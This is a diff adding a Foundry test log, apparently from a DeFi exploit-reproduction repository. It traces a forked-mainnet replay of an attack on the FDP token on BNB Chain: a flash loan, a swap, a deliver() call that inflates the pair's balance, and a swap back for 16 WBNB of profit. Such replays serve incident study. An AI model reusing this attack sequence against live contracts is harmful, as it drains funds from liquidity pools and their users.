@@ -1,0 +1,126 @@
+Compiling 27 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.19s
+Compiler run successful!
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 235.61ms (139.92µs CPU time)
+
+Ran 1 test for src/test/2023-02/FDP_exp.sol:Exploit
+[PASS] testHack() (gas: 339727)
+Logs:
+  50070 FDP in Pair before deliver
+  49925 FDP in attack contract before deliver
+  -------------Delivering-------------
+  11124332 FDP in Pair after deliver
+  4768241 FDP in attack contract after deliver
+  
+ Attacker's profit: 16 WBNB
+
+Traces:
+  [370827] Exploit::testHack()
+    ├─ [0] VM::createSelectFork("https://1rpc.io/bnb", 25430418 [2.543e7])
+    │   └─ ← [Return] 0
+    ├─ [364784] 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681::flashLoan(16320000000000000000 [1.632e19], 0, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307831)
+    │   ├─ [29962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16320000000000000000 [1.632e19])
+    │   │   ├─ emit Transfer(from: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 16320000000000000000 [1.632e19])
+    │   │   └─ ← [Return] true
+    │   ├─ [305979] Exploit::DPPFlashLoanCall(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16320000000000000000 [1.632e19], 0, 0x307831)
+    │   │   ├─ [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24681] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [139129] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(16320000000000000000 [1.632e19], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3, 16320000000000000000 [1.632e19])
+    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3, value: 16320000000000000000 [1.632e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [21152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2893] 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000152cc9d81eaf81523c0c000000000000000000000000000000000000000000000000e294189c79d4b8d20000000000000000000000000000000000000000000000000000000060bbd33a
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   │   └─ ← [Return] 32646701609462839506 [3.264e19]
+    │   │   │   ├─ [91481] 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3::swap(49925109590047580102880 [4.992e22], 0, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [52486] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 49925109590047580102880 [4.992e22])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 49925109590047580102880 [4.992e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [5152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 50070843098193920432940 [5.007e22]
+    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 32646701609462839506 [3.264e19]
+    │   │   │   │   ├─ emit Sync(: 50070843098193920432940 [5.007e22], : 32646701609462839506 [3.264e19])
+    │   │   │   │   ├─ emit Swap(param0: 0x10ED43C718714eb63d5aA57B78B54704E256024E, param1: 55400000000000000 [5.54e16], param2: 16320000000000000000 [1.632e19], param3: 49925109590047580102880 [4.992e22], param4: 0, param5: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [5152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 49925109590047580102880 [4.992e22]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [5152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   └─ ← [Return] 50070843098193920432940 [5.007e22]
+    │   │   ├─ [0] console::log("%s FDP in Pair before deliver", 50070 [5.007e4]) [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [5152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 49925109590047580102880 [4.992e22]
+    │   │   ├─ [0] console::log("%s FDP in attack contract before deliver", 49925 [4.992e4]) [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log("-------------Delivering-------------") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [31732] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::deliver(28463160000000000000000 [2.846e22])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [5152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   └─ ← [Return] 11124332801853764113675419 [1.112e25]
+    │   │   ├─ [0] console::log("%s FDP in Pair after deliver", 11124332 [1.112e7]) [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [5152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 4768241456371843363743920 [4.768e24]
+    │   │   ├─ [0] console::log("%s FDP in attack contract after deliver", 4768241 [4.768e6]) [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   └─ ← [Return] 32646701609462839506 [3.264e19]
+    │   │   ├─ [42876] 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3::swap(0, 32496701609462839506 [3.249e19], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32496701609462839506 [3.249e19])
+    │   │   │   │   ├─ emit Transfer(from: 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 32496701609462839506 [3.249e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [5152] 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   │   └─ ← [Return] 11124332801853764113675419 [1.112e25]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3) [staticcall]
+    │   │   │   │   └─ ← [Return] 150000000000000000 [1.5e17]
+    │   │   │   ├─ emit Sync(: 11124332801853764113675419 [1.112e25], : 150000000000000000 [1.5e17])
+    │   │   │   ├─ emit Swap(param0: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 11074261958755570193242479 [1.107e25], param2: 0, param3: 0, param4: 32496701609462839506 [3.249e19], param5: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, 16320000000000000000 [1.632e19])
+    │   │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, value: 16320000000000000000 [1.632e19])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 16176701609462839506 [1.617e19]
+    │   │   ├─ [0] console::log("\n Attacker's profit: %s WBNB", 16) [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
+    │   │   └─ ← [Return] 1363426920555815103015 [1.363e21]
+    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
+    │   │   └─ ← [Return] 550947305608116485336872 [5.509e23]
+    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
+    │   │   └─ ← [Return] 1363426920555815103015 [1.363e21]
+    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
+    │   │   └─ ← [Return] 550947305608116485336872 [5.509e23]
+    │   ├─ emit DODOFlashLoan(: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 16320000000000000000 [1.632e19], : 0)
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 522.33ms (522.14ms CPU time)
+
+Ran 2 test suites in 523.85ms (757.94ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
